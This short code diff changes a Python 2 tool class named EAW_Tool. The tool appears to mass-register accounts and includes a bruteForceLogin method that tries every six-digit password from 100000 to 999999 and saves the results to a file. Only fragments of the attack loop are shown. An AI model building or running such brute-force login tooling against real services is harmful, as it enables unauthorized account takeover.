@@ -63,9 +63,10 @@ class EAW_Tool:
             account=str(init_number)
             print 'Regesting account:'+ account
             init_number += 1
-            responseJson = self.register(account, password)
-            print responseJson['code'], responseJson['message']
-            if responseJson['code'] == 0:
+            response = self.register(account, password)
+            contentJson = response.json()
+            print contentJson['code'], contentJson['message']
+            if contentJson['code'] == 0:
                 print 'Register account succeeded:' + account
             else: 
                 print 'Save existing account:' + account
@@ -77,7 +78,7 @@ class EAW_Tool:
 
     # brute force try password 6 digits password 100000 - 999999
     def bruteForceLogin(self, account):
-        start=110432
+        start=100000
         maximum = 999999
         targetPwdFile= open('target-pwd.txt', 'a')
         while start < maximum:
